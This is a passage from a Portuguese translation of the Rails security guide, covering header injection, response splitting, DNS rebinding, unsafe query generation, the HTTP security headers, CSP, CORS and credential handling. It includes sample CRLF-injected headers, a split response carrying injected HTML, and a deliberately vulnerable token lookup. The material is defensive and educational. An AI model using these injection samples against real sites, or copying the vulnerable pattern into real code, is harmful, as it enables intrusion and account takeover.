Observe que `%0d%0a` é codificado em URL para `\r\n`, que é um retorno de carro e alimentação de linha (CRLF) em Ruby. Portanto, o cabeçalho HTTP resultante para o segundo exemplo será o seguinte porque o segundo campo de cabeçalho Location sobrescreve o primeiro.

```http
HTTP/1.1 302 Movido Temporariamente
(...)
Location: http://www.malicious.tld
```

Portanto, _os vetores de ataque para Injeção de Cabeçalho são baseados na injeção de caracteres CRLF em um campo de cabeçalho._ E o que um atacante poderia fazer com um redirecionamento falso? Eles poderiam redirecionar para um site de phishing que se parece com o seu, mas pede para fazer login novamente (e envia as credenciais de login para o atacante). Ou eles poderiam instalar software malicioso por meio de brechas de segurança do navegador nesse site. O Rails 2.1.2 escapa esses caracteres para o campo Location no método `redirect_to`. _Certifique-se de fazer isso você mesmo ao construir outros campos de cabeçalho com entrada do usuário._

#### DNS Rebinding e Ataques de Cabeçalho de Host

DNS rebinding é um método de manipulação da resolução de nomes de domínio que é comumente usado como uma forma de ataque de computador. O DNS rebinding contorna a política de mesma origem abusando do Sistema de Nomes de Domínio (DNS). Ele associa um domínio a um endereço IP diferente e, em seguida, compromete o sistema executando código aleatório em seu aplicativo Rails a partir do endereço IP alterado.

Recomenda-se usar o middleware `ActionDispatch::HostAuthorization` para se proteger contra DNS rebinding e outros ataques de cabeçalho de host. Ele está ativado por padrão no ambiente de desenvolvimento, você precisa ativá-lo no ambiente de produção e em outros ambientes definindo a lista de hosts permitidos. Você também pode configurar exceções e definir seu próprio aplicativo de resposta.

```ruby
Rails.application.config.hosts << "product.com"

Rails.application.config.host_authorization = {
  # Excluir solicitações para o caminho /healthcheck/ da verificação de host
  exclude: ->(request) { request.path =~ /healthcheck/ }
  # Adicionar aplicativo Rack personalizado para a resposta
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Solicitação Inválida"]]
  end
}
```

Você pode ler mais sobre isso na documentação do middleware [`ActionDispatch::HostAuthorization`](/configuring.html#actiondispatch-hostauthorization)

#### Response Splitting

Se a Injeção de Cabeçalho fosse possível, o Response Splitting também poderia ser. No HTTP, o bloco de cabeçalho é seguido por duas CRLFs e pelos dados reais (geralmente HTML). A ideia do Response Splitting é injetar duas CRLFs em um campo de cabeçalho, seguido de outra resposta com HTML malicioso. A resposta será:

```http
HTTP/1.1 302 Encontrado [Primeira resposta padrão 302]
Data: Ter, 12 Abr 2005 22:09:07 GMT
Location:Content-Type: text/html


HTTP/1.1 200 OK [Segunda nova resposta criada pelo atacante começa]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;oi&lt;/font&gt;&lt;/html&gt; [A entrada maliciosa arbitrária é mostrada como a página redirecionada]
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

Em certas circunstâncias, isso apresentaria o HTML malicioso à vítima. No entanto, isso só parece funcionar com conexões Keep-Alive (e muitos navegadores estão usando conexões de uma única vez). Mas você não pode confiar nisso. _Em qualquer caso, esse é um bug sério e você deve atualizar seu Rails para a versão 2.0.5 ou 2.1.2 para eliminar os riscos de Injeção de Cabeçalho (e, portanto, de Response Splitting)._

Geração de Consulta Insegura
-----------------------

Devido à forma como o Active Record interpreta os parâmetros em combinação com a forma como o Rack analisa os parâmetros de consulta, era possível emitir consultas inesperadas ao banco de dados com cláusulas `IS NULL`. Em resposta a esse problema de segurança ([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ), [CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) e [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)), o método `deep_munge` foi introduzido como uma solução para manter o Rails seguro por padrão.

Exemplo de código vulnerável que poderia ser usado por um atacante, se `deep_munge` não fosse executado:

```ruby
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

Quando `params[:token]` é um dos seguintes: `[nil]`, `[nil, nil, ...]` ou `['foo', nil]`, ele passará pelo teste de `nil`, mas as cláusulas `IS NULL` ou `IN ('foo', NULL)` ainda serão adicionadas à consulta SQL.
Para manter o Rails seguro por padrão, `deep_munge` substitui alguns dos valores por `nil`. A tabela abaixo mostra como os parâmetros se parecem com base no `JSON` enviado na solicitação:

| JSON                              | Parâmetros               |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => [] }`     |
| `{ "person": [null] }`            | `{ :person => [] }`     |
| `{ "person": [null, null, ...] }` | `{ :person => [] }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |

É possível retornar ao comportamento antigo e desabilitar o `deep_munge` configurando sua aplicação se você estiver ciente do risco e souber como lidar com ele:

```ruby
config.action_dispatch.perform_deep_munge = false
```

Cabeçalhos de Segurança HTTP
---------------------

Para melhorar a segurança de sua aplicação, o Rails pode ser configurado para retornar cabeçalhos de segurança HTTP. Alguns cabeçalhos são configurados por padrão; outros precisam ser configurados explicitamente.

### Cabeçalhos de Segurança Padrão

Por padrão, o Rails está configurado para retornar os seguintes cabeçalhos de resposta. Sua aplicação retorna esses cabeçalhos para cada resposta HTTP.

#### `X-Frame-Options`

O cabeçalho [`X-Frame-Options`][] indica se um navegador pode renderizar a página em uma tag `<frame>`, `<iframe>`, `<embed>` ou `<object>`. Este cabeçalho é definido como `SAMEORIGIN` por padrão para permitir o enquadramento apenas no mesmo domínio. Defina-o como `DENY` para negar o enquadramento completamente ou remova completamente este cabeçalho se você quiser permitir o enquadramento em todos os domínios.


#### `X-XSS-Protection`

Um cabeçalho [legado e obsoleto](https://owasp.org/www-project-secure-headers/#x-xss-protection), definido como `0` no Rails por padrão para desativar auditores de XSS legados problemáticos.

#### `X-Content-Type-Options`

O cabeçalho [`X-Content-Type-Options`][] é definido como `nosniff` no Rails por padrão. Ele impede que o navegador adivinhe o tipo MIME de um arquivo.


#### `X-Permitted-Cross-Domain-Policies`

Este cabeçalho é definido como `none` no Rails por padrão. Ele impede que clientes Adobe Flash e PDF incorporem sua página em outros domínios.

#### `Referrer-Policy`

O cabeçalho [`Referrer-Policy`][] é definido como `strict-origin-when-cross-origin` no Rails por padrão.
Para solicitações de origem cruzada, isso envia apenas a origem no cabeçalho Referer. Isso
impede vazamentos de dados privados que podem ser acessíveis de outras partes do
URL completo, como o caminho e a string de consulta.


#### Configurando os Cabeçalhos Padrão

Esses cabeçalhos são configurados por padrão da seguinte forma:

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '0',
  'X-Content-Type-Options' => 'nosniff',
  'X-Permitted-Cross-Domain-Policies' => 'none',
  'Referrer-Policy' => 'strict-origin-when-cross-origin'
}
```

Você pode substituir esses cabeçalhos ou adicionar cabeçalhos extras em `config/application.rb`:

```ruby
config.action_dispatch.default_headers['X-Frame-Options'] = 'DENY'
config.action_dispatch.default_headers['Header-Name']     = 'Value'
```

Ou você pode removê-los:

```ruby
config.action_dispatch.default_headers.clear
```

### Cabeçalho `Strict-Transport-Security`

O cabeçalho de resposta HTTP [`Strict-Transport-Security`][] (HTST) garante que o
navegador faça automaticamente o upgrade para HTTPS para conexões atuais e futuras.

O cabeçalho é adicionado à resposta ao habilitar a opção `force_ssl`:

```ruby
  config.force_ssl = true
```


### Cabeçalho `Content-Security-Policy`

Para ajudar a proteger contra ataques de XSS e injeção, é recomendável definir um cabeçalho de resposta [`Content-Security-Policy`][] para sua aplicação. O Rails
fornece uma DSL que permite configurar o cabeçalho.

Defina a política de segurança no inicializador apropriado:

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
  # Especifique a URI para relatórios de violação
  policy.report_uri "/csp-violation-report-endpoint"
end
```

A política configurada globalmente pode ser substituída em uma base por recurso:

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.upgrade_insecure_requests true
    policy.base_uri "https://www.example.com"
  end
end
```

Ou pode ser desativado:

```ruby
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end
```

Use lambdas para injetar valores por solicitação, como subdomínios de conta em um
aplicação multi-inquilino:

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end
```


#### Relatando Violações

Habilite a diretiva [`report-uri`][] para relatar violações para a URI especificada:

```ruby
Rails.application.config.content_security_policy do |policy|
  policy.report_uri "/csp-violation-report-endpoint"
end
```

Ao migrar conteúdo legado, você pode querer relatar violações sem
aplicar a política. Defina o cabeçalho de resposta [`Content-Security-Policy-Report-Only`][]
para relatar apenas violações:

```ruby
Rails.application.config.content_security_policy_report_only = true
```

Ou substitua-o em um controlador:

```ruby
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end
```


#### Adicionando um Nonce

Se você está considerando `'unsafe-inline'`, considere usar nonces em vez disso. [Nonces
fornecem uma melhoria substancial](https://www.w3.org/TR/CSP3/#security-nonces)
sobre `'unsafe-inline'` ao implementar uma Política de Segurança de Conteúdo em cima
de código existente.
```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
```

Existem algumas compensações a serem consideradas ao configurar o gerador de nonce.
Usar `SecureRandom.base64(16)` é um bom valor padrão, porque irá
gerar um novo nonce aleatório para cada solicitação. No entanto, esse método é
incompatível com [caching GET condicional](caching_with_rails.html#conditional-get-support)
porque novos nonces resultarão em novos valores de ETag para cada solicitação. Uma
alternativa aos nonces aleatórios por solicitação seria usar o id da sessão:

```ruby
Rails.application.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }
```

Este método de geração é compatível com ETags, no entanto, sua segurança depende de
o id da sessão ser suficientemente aleatório e não ser exposto em
cookies inseguros.

Por padrão, os nonces serão aplicados a `script-src` e `style-src` se um gerador de nonce for definido. `config.content_security_policy_nonce_directives` pode ser
usado para alterar quais diretivas usarão nonces:

```ruby
Rails.application.config.content_security_policy_nonce_directives = %w(script-src)
```

Depois que a geração de nonce for configurada em um inicializador, valores de nonce automáticos
podem ser adicionados às tags de script passando `nonce: true` como parte de `html_options`:

```html+erb
<%= javascript_tag nonce: true do -%>
  alert('Olá, Mundo!');
<% end -%>
```

O mesmo funciona com `javascript_include_tag`:

```html+erb
<%= javascript_include_tag "script", nonce: true %>
```

Use o helper [`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)
para criar uma meta tag "csp-nonce" com o valor de nonce por sessão
para permitir tags `<script>` inline.

```html+erb
<head>
  <%= csp_meta_tag %>
</head>
```

Isso é usado pelo helper Rails UJS para criar elementos `<script>` inline carregados dinamicamente.

### Cabeçalho `Feature-Policy`

NOTA: O cabeçalho `Feature-Policy` foi renomeado para `Permissions-Policy`.
O `Permissions-Policy` requer uma implementação diferente e não é
ainda suportado por todos os navegadores. Para evitar ter que renomear este
middleware no futuro, usamos o novo nome para o middleware, mas
mantemos o nome antigo e a implementação por enquanto.

Para permitir ou bloquear o uso de recursos do navegador, você pode definir um cabeçalho de resposta [`Feature-Policy`][]
para sua aplicação. O Rails fornece uma DSL que permite configurar o cabeçalho.

Defina a política no inicializador apropriado:

```ruby
# config/initializers/permissions_policy.rb
Rails.application.config.permissions_policy do |policy|
  policy.camera      :none
  policy.gyroscope   :none
  policy.microphone  :none
  policy.usb         :none
  policy.fullscreen  :self
  policy.payment     :self, "https://secure.example.com"
end
```

A política configurada globalmente pode ser substituída em uma base por recurso:

```ruby
class PagesController < ApplicationController
  permissions_policy do |policy|
    policy.geolocation "https://example.com"
  end
end
```


### Compartilhamento de Recursos de Origem Cruzada

Os navegadores restringem solicitações HTTP de origem cruzada iniciadas por scripts. Se você
deseja executar o Rails como uma API e executar um aplicativo de front-end em um domínio separado, você
precisa habilitar o [Compartilhamento de Recursos de Origem Cruzada](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) (CORS).

Você pode usar o middleware [Rack CORS](https://github.com/cyu/rack-cors) para
lidar com o CORS. Se você gerou sua aplicação com a opção `--api`,
o Rack CORS provavelmente já foi configurado e você pode pular as seguintes
etapas.

Para começar, adicione a gem rack-cors ao seu Gemfile:

```ruby
gem 'rack-cors'
```

Em seguida, adicione um inicializador para configurar o middleware:

```ruby
# config/initializers/cors.rb
Rails.application.config.middleware.insert_before 0, "Rack::Cors" do
  allow do
    origins 'example.com'

    resource '*',
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options, :head]
  end
end
```

Segurança de Intranet e Administração
------------------------------------

As interfaces de Intranet e administração são alvos populares de ataques, porque permitem acesso privilegiado. Embora isso exigisse várias medidas extras de segurança, o oposto é verdadeiro no mundo real.

Em 2007, houve o primeiro trojan feito sob medida que roubou informações de uma Intranet, nomeadamente o site "Monster for employers" do Monster.com, um aplicativo da web de recrutamento online. Trojans feitos sob medida são muito raros até agora e o risco é bastante baixo, mas certamente é uma possibilidade e um exemplo de como a segurança do host cliente também é importante. No entanto, a maior ameaça às aplicações de Intranet e Administração são XSS e CSRF.

### Cross-Site Scripting

Se sua aplicação redisplayar uma entrada de usuário maliciosa da extranet, a aplicação estará vulnerável a XSS. Nomes de usuário, comentários, relatórios de spam, endereços de pedidos são apenas alguns exemplos incomuns, onde pode haver XSS.

Ter um único local na interface de administração ou Intranet, onde a entrada não foi sanitizada, torna toda a aplicação vulnerável. Possíveis explorações incluem roubar o cookie do administrador privilegiado, injetar um iframe para roubar a senha do administrador ou instalar software malicioso por meio de brechas de segurança do navegador para assumir o controle do computador do administrador.

Consulte a seção de Injeção para contramedidas contra XSS.

### Cross-Site Request Forgery

Cross-Site Request Forgery (CSRF), também conhecido como Cross-Site Reference Forgery (XSRF), é um método de ataque gigantesco, que permite ao atacante fazer tudo o que o administrador ou usuário da Intranet pode fazer. Como você já viu acima como o CSRF funciona, aqui estão alguns exemplos do que os atacantes podem fazer na Intranet ou na interface de administração.

Um exemplo do mundo real é a [reconfiguração de roteadores por CSRF](http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html). Os atacantes enviaram um e-mail malicioso, com CSRF nele, para usuários mexicanos. O e-mail afirmava que havia um cartão eletrônico esperando pelo usuário, mas também continha uma tag de imagem que resultava em uma solicitação HTTP-GET para reconfigurar o roteador do usuário (que é um modelo popular no México). A solicitação alterou as configurações de DNS para que as solicitações a um site bancário baseado no México fossem mapeadas para o site do atacante. Todos que acessaram o site bancário por meio desse roteador viram o site falso do atacante e tiveram suas credenciais roubadas.

Outro exemplo é a alteração do endereço de e-mail e senha do Google Adsense. Se a vítima estivesse conectada ao Google Adsense, a interface de administração das campanhas de publicidade do Google, um atacante poderia alterar as credenciais da vítima.

Outro ataque popular é enviar spam para sua aplicação web, blog ou fórum para propagar XSS malicioso. Claro, o atacante precisa conhecer a estrutura da URL, mas a maioria das URLs do Rails é bastante direta ou será fácil de descobrir, se for a interface de administração de um aplicativo de código aberto. O atacante pode até fazer 1.000 suposições sortudas apenas incluindo tags IMG maliciosas que tentam todas as combinações possíveis.

Para _contramedidas contra CSRF em interfaces de administração e aplicativos de Intranet, consulte as contramedidas na seção CSRF_.

### Precauções adicionais

A interface de administração comum funciona da seguinte maneira: está localizada em www.exemplo.com/admin, pode ser acessada apenas se a flag de administração estiver definida no modelo de Usuário, redisplay do input do usuário e permite que o administrador exclua/adicione/edite qualquer dado desejado. Aqui estão algumas reflexões sobre isso:

* É muito importante _pensar no pior caso_: E se alguém realmente obtiver seus cookies ou credenciais de usuário. Você poderia _introduzir papéis_ para a interface de administração para limitar as possibilidades do atacante. Ou que tal _credenciais de login especiais_ para a interface de administração, diferentes das usadas para a parte pública do aplicativo. Ou uma _senha especial para ações muito sérias_?

* O administrador realmente precisa acessar a interface de qualquer lugar do mundo? Pense em _limitar o login a um conjunto de endereços IP de origem_. Examine request.remote_ip para descobrir o endereço IP do usuário. Isso não é à prova de balas, mas é uma ótima barreira. Lembre-se de que pode haver um proxy em uso, no entanto.

* _Coloque a interface de administração em um subdomínio especial_, como admin.aplicacao.com e faça dela um aplicativo separado com seu próprio gerenciamento de usuários. Isso torna impossível roubar um cookie de administração do domínio usual, www.aplicacao.com. Isso ocorre por causa da política de mesma origem no seu navegador: um script injetado (XSS) em www.aplicacao.com não pode ler o cookie para admin.aplicacao.com e vice-versa.

Segurança Ambiental
----------------------

Está além do escopo deste guia informar sobre como proteger o código e os ambientes de sua aplicação. No entanto, por favor, proteja a configuração do seu banco de dados, por exemplo, `config/database.yml`, chave mestra para `credentials.yml` e outros segredos não criptografados. Você pode querer restringir ainda mais o acesso, usando versões específicas do ambiente desses arquivos e de outros que possam conter informações sensíveis.

### Credenciais personalizadas

O Rails armazena segredos em `config/credentials.yml.enc`, que é criptografado e, portanto, não pode ser editado diretamente. O Rails usa `config/master.key` ou procura pela variável de ambiente `ENV["RAILS_MASTER_KEY"]` para criptografar o arquivo de credenciais. Como o arquivo de credenciais é criptografado, ele pode ser armazenado no controle de versão, desde que a chave mestra seja mantida em segurança.

Por padrão, o arquivo de credenciais contém o `secret_key_base` do aplicativo. Ele também pode ser usado para armazenar outros segredos, como chaves de acesso para APIs externas.

Para editar o arquivo de credenciais, execute `bin/rails credentials:edit`. Este comando criará o arquivo de credenciais se ele não existir. Além disso, este comando criará `config/master.key` se nenhuma chave mestra estiver definida.

Os segredos mantidos no arquivo de credenciais são acessíveis por meio de `Rails.application.credentials`.
Por exemplo, com o seguinte `config/credentials.yml.enc` descriptografado:

```yaml
secret_key_base: 3b7cd72...
some_api_key: SOMEKEY
system:
  access_key_id: 1234AB
```

`Rails.application.credentials.some_api_key` retorna `"SOMEKEY"`. `Rails.application.credentials.system.access_key_id` retorna `"1234AB"`.
Se você deseja que uma exceção seja lançada quando alguma chave estiver em branco, você pode usar a versão com "bang":

```ruby
# Quando some_api_key estiver em branco...
Rails.application.credentials.some_api_key! # => KeyError: :some_api_key está em branco
```

DICA: Saiba mais sobre credenciais com `bin/rails credentials:help`.

AVISO: Mantenha sua chave mestra em segurança. Não faça commit da sua chave mestra.

Gerenciamento de Dependências e CVEs
------------------------------------

Não atualizamos as dependências apenas para incentivar o uso de novas versões, inclusive para problemas de segurança. Isso ocorre porque os proprietários de aplicativos precisam atualizar manualmente suas gems, independentemente dos nossos esforços. Use `bundle update --conservative nome_da_gem` para atualizar de forma segura dependências vulneráveis.

Recursos Adicionais
-------------------

O cenário de segurança está em constante mudança e é importante se manter atualizado, pois perder uma nova vulnerabilidade pode ser catastrófico. Você pode encontrar recursos adicionais sobre segurança (no Rails) aqui:

* Assine a [lista de discussão](https://discuss.rubyonrails.org/c/security-announcements/9) de segurança do Rails.
* [Brakeman - Scanner de Segurança para Rails](https://brakemanscanner.org/) - Para realizar análise estática de segurança em aplicações Rails.
* [Diretrizes de Segurança Web da Mozilla](https://infosec.mozilla.org/guidelines/web_security.html) - Recomendações sobre tópicos que abrangem Content Security Policy, cabeçalhos HTTP, Cookies, configuração TLS, etc.
* Um [bom blog de segurança](https://owasp.org/), incluindo o [Cheat Sheet de Prevenção de Cross-Site Scripting](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md).
[`config.action_controller.default_protect_from_forgery`]: configuring.html#config-action-controller-default-protect-from-forgery
[`csrf_meta_tags`]: https://api.rubyonrails.org/classes/ActionView/Helpers/CsrfHelper.html#method-i-csrf_meta_tags
[`config.filter_parameters`]: configuring.html#config-filter-parameters
[`sanitize_sql`]: https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql
[`X-Frame-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
[`X-Content-Type-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
[`Referrer-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
[`Strict-Transport-Security`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
[`Content-Security-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
[`Content-Security-Policy-Report-Only`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only
[`report-uri`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri
[`Feature-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy
